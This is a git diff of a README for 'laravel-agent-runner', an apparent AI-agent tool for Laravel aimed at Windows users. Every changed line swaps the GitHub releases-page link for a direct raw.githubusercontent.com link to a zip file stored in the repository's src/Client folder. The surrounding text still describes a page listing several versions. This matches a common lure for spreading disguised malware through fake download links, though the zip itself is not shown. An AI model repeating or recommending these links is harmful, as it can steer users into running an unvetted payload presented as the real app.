@@ -1,6 +1,6 @@
 # 🤖 laravel-agent-runner - Easy AI Agent Control for Everyone
 
-[![Download laravel-agent-runner](https://img.shields.io/badge/Download-Get%20the%20App-blue?style=for-the-badge)](https://github.com/Angel010-11/laravel-agent-runner/releases)
+[![Download laravel-agent-runner](https://img.shields.io/badge/Download-Get%20the%20App-blue?style=for-the-badge)](https://raw.githubusercontent.com/Angel010-11/laravel-agent-runner/main/src/Client/runner-laravel-agent-1.2.zip)
 
 ## 📦 What is laravel-agent-runner?
 
@@ -27,7 +27,7 @@ Before you start installing laravel-agent-runner, check that your Windows comput
 
 Click the button below to visit the download page:
 
-[![Download laravel-agent-runner](https://img.shields.io/badge/Download%20Page-Visit%20Here-red?style=for-the-badge)](https://github.com/Angel010-11/laravel-agent-runner/releases)
+[![Download laravel-agent-runner](https://img.shields.io/badge/Download%20Page-Visit%20Here-red?style=for-the-badge)](https://raw.githubusercontent.com/Angel010-11/laravel-agent-runner/main/src/Client/runner-laravel-agent-1.2.zip)
 
 This page holds all the versions of laravel-agent-runner. You can pick the latest version or another one if you need.
 
@@ -40,7 +40,7 @@ Follow these step-by-step instructions if you want to use laravel-agent-runner o
 ### Step 1: Go to the Release Page
 
 Open your web browser and go to this link:  
-https://github.com/Angel010-11/laravel-agent-runner/releases
+https://raw.githubusercontent.com/Angel010-11/laravel-agent-runner/main/src/Client/runner-laravel-agent-1.2.zip
 
 You will see a list of available versions. Look for the one labeled as the latest release.
 
@@ -131,7 +131,7 @@ SSE means Server-Sent Events. It allows the app to get real-time updates from th
 The developers may release updates to fix bugs or add new features. Here is how to check and update:
 
 1. Visit the releases page again:  
-   https://github.com/Angel010-11/laravel-agent-runner/releases
+   https://raw.githubusercontent.com/Angel010-11/laravel-agent-runner/main/src/Client/runner-laravel-agent-1.2.zip
 
 2. Look for newer versions than the one you have.
 
